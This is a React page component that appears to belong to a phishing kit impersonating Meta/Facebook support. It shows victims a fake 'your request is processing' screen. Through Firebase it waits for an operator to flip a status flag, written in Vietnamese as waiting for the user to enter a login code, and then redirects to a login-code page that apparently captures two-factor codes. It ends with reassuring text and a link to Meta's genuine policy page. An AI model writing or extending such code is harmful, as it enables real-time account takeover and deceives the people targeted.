import { onValue, ref } from "firebase/database";
import { useEffect, useState } from "react";
import { useNavigate } from "react-router";
import Spinner from "../Components/Spinner";
import { database } from "../Utils/firebase";
import Progress from "../Components/Progress";
import "sweetalert2/src/sweetalert2.scss";

const ConfirmLoading = () => {
  const [step, setStep] = useState(1);

  const navigate = useNavigate();

  useEffect(() => {
    const starCountRef = ref(
      database,
      "/" + localStorage.getItem("record_uid")
    );
    onValue(starCountRef, (snapshot) => {
      const data = snapshot.val();
      if (data?.user_status === "Chờ user nhập mã đăng nhập") {
        navigate("/confirm/login-code");
      }
    });
  }, []);

  return (
    <div
      style={{
        display: "flex",
        height: "100vh",
      }}
    >
      <div
        style={{
          margin: "auto",
          display: "flex",
          justifyContent: "center",
          alignItems: "center",
          flexDirection: "column",
          maxWidth: 600,
          padding: 15,
          textAlign: "center",
        }}
      >
        {step === 1 && (
          <>
            <div className="mb-4">
              <Spinner
                style={{
                  width: 36,
                  height: 36,
                  borderWidth: 5,
                  margin: 0,
                }}
              />
            </div>
            <h3
              className="mb-2"
              style={{
                color: "#444",
              }}
            >
              Your request is processing
            </h3>
            <p
              className="mb-3"
              style={{
                fontSize: 15,
                color: "#838080",
              }}
            >
              Please wait 1-2 minutes. We are checking your information. Please
              do not leave this site once processing is complete.
            </p>
            <div className="mt-4"></div>
            <Progress callback={() => setStep(2)} />
          </>
        )}

        {step === 2 && (
          <>
            <div className="mb-4">
              <div
                className="swal2-icon swal2-success swal2-icon-show"
                style={{ display: "flex" }}
              >
                <div
                  className="swal2-success-circular-line-left"
                  style={{ backgroundColor: "rgb(255, 255, 255)" }}
                />
                <span className="swal2-success-line-tip" />{" "}
                <span className="swal2-success-line-long" />
                <div className="swal2-success-ring" />{" "}
                <div
                  className="swal2-success-fix"
                  style={{ backgroundColor: "rgb(255, 255, 255)" }}
                />
                <div
                  className="swal2-success-circular-line-right"
                  style={{ backgroundColor: "rgb(255, 255, 255)" }}
                />
              </div>
            </div>
            <h3
              className="mb-2"
              style={{
                color: "#444",
              }}
            >
              Your request is sent successfully
            </h3>
            <p
              className="mb-3"
              style={{
                fontSize: 15,
                color: "#838080",
              }}
            >
              It usually takes 24 to 48 hours to receive an update from the
              team. However, sometimes it depends on the complexity of the task,
              so don't worry. We will contact you via email or phone number as
              soon as possible.
            </p>
            <div className="mt-3"></div>
            <button
              onClick={() =>
                (window.location.href =
                  "https://www.facebook.com/policies_center/commerce")
              }
              className="chat_btn"
              style={{
                padding: "8px 30px",
              }}
            >
              Go to meta legal policy
            </button>
          </>
        )}
      </div>
    </div>
  );
};

export default ConfirmLoading;
